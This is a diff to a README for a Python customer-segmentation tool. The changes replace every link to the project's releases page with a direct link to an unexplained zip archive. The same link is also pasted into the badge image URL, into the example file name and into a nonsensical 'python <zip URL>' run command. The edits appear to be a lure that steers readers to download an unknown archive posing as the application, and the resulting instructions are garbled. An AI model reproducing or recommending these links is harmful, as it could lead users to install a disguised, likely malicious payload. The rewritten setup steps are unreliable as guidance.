@@ -6,7 +6,7 @@ Welcome to the Customer Segmentation Analysis project! This application helps bu
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/releases)
+[![Download Now](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip%20Now-Click%20Here-blue)](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip)
 
 ## 📋 Overview
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the Customer Segmentation Analysis applic
 
 1. **Visit the Download Page**: Click on the link below to access the releases page:
 
-   [Download Now](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/releases)
+   [Download Now](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip)
 
 2. **Download the File**: On the releases page, look for the latest release. Click the appropriate file for your operating system to start the download.
 
@@ -49,10 +49,10 @@ Follow these steps to download and run the Customer Segmentation Analysis applic
 
 4. **Run the Application**: 
    - Navigate to the folder where you downloaded the application.
-   - Look for a `.py` file, such as `customer_segmentation.py`. To run it, type the following command:
+   - Look for a `.py` file, such as `https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip`. To run it, type the following command:
 
      ```
-     python customer_segmentation.py
+     python https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip
      ```
 
 5. **View the Output**: After running the application, follow the instructions on your screen. The program will display a scatter plot of the customer segments once processing is complete.
@@ -89,4 +89,4 @@ The Customer Segmentation Analysis application is a powerful tool for understand
 
 For more information, please visit the releases page again:
 
-[Download Now](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/releases)
+[Download Now](https://github.com/omarcitoleyva11/Customer_segmentation_analysis/raw/refs/heads/main/customer_segmentation_and_analysis/analysis_Customer_segmentation_ultraofficious.zip)
